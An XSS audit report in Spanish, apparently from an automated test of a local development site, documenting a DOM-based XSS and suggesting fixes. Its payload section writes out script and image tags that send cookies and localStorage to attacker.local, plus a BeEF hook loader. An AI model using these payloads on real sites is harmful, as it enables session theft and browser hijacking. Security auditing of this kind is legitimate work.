# Informe de Auditoría XSS - 2026-04-16T12:30:08

Resumen:
- Objetivo: http://web.dev.local:8082
- Vectores probados: Parámetros GET (search, name, comment), cabeceras (User-Agent), almacenamiento local (localStorage) y sinks DOM (document.write)

Hallazgos:
- Se detectó XSS basado en DOM. La aplicación utiliza URLSearchParams y document.write para renderizar `search`, `name` y `comment` sin saneamiento.
- Tipo: DOM-based XSS (reflected via search, persistent-like via localStorage comments)

Pruebas realizadas (comandos):
1) Recon:
   curl -s -D /tmp/headers.txt http://web.dev.local:8082/ -o /tmp/root.html

2) Payload simple para confirmación (reflejado en DOM):
   curl -s "http://web.dev.local:8082/?search=%3Cscript%3Ealert(1)%3C/script%3E" -o /tmp/test_search1.html

3) Payload en comentarios (simulación de persistencia en localStorage):
   curl -s "http://web.dev.local:8082/?name=attacker&comment=%3Cscript%3Ealert(1)%3C/script%3E" -o /tmp/test_comment1.html

Simulación de explotación (JS DOM con jsdom):
- Se preparó un script Node.js para cargar la página con URL que incluye un payload capaz de exfiltrar cookies y localStorage mediante fetch hacia un servidor atacante.
- Intento de ejecución falló por ausencia de dependencia jsdom en el entorno de ejecución (node: Error: Cannot find module 'jsdom').

Payloads de explotación propuestos (ofuscados y reales):
1) Robo de sesión (fetch):
   <script>fetch('http://attacker.local:9000/?c='+encodeURIComponent(document.cookie)+'&ls='+encodeURIComponent(localStorage.getItem('comments')))</script>

2) Imagen exfil (evita CORS en algunos navegadores):
   <img src="http://attacker.local:9000/?c='+encodeURIComponent(document.cookie)+'" onerror="" />

3) Hook BeEF simulado:
   <script src="http://attacker.local:3000/hook.js"></script>

Impacto:
- Un atacante que convenza a un usuario autenticado para visitar una URL maliciosa podría robar cookies, tokens en localStorage y ejecutar código arbitrario en el contexto del sitio (p. ej., publicar comentarios en nombre de la víctima, modificar DOM, cargar hooks remotos).

Evidencias:
- Inspección del código fuente (se presenta en el informe) mostrando document.write con valores de URLSearchParams y almacenamiento en localStorage sin saneamiento.

Recomendaciones:
1) Evitar el uso de document.write con datos no confiables. Usar APIs seguras (textContent/innerText) o plantillas que escapen HTML.
2) Escapar/filtrar entradas antes de renderizar (encodeEntities para <, >, ", ').
3) Para comentarios persistentes, renderizar en el servidor con sanitización o usar librerías confiables (DOMPurify) en el cliente.

Estado actual de la auditoría:
- VULN_FOUND: true
- VULN_EXPLOITED: false (explotación completa no verificada por falta de jsdom ejecución y servidor remoto de captura en el entorno)

---
Fecha del informe: 2026-04-16T12:30:08
